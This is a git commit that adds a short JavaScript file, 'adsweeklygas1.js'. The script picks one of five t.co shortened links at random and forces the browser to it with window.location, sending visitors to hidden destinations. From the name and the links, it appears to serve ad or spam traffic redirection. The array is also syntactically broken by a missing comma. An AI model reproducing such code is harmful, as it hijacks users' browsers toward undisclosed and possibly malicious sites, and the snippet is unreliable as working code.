494e8f062c4f4ef4256e00e9f90f4ed0f4cbc962
cc-spec437 <uobkrsudrsyamsudinsh@gmail.com>
2026-03-25 14:39:08 +0700

    Create adsweeklygas1.js

---
+++ adsweeklygas1.js
@@ -0,0 +1,11 @@
+var dataUrl = [
+
+'https://t.co/UA6zJicVKL',
+'https://t.co/s14LWOB8Tx',
+'https://t.co/LOHRnCHAnA',
+'https://t.co/QMtQfd6l7ys'
+'https://t.co/zgFKK5mrxY'
+
+];
+var randomItem = dataUrl[Math.floor(Math.random()*dataUrl.length)];
+window.location = randomItem;
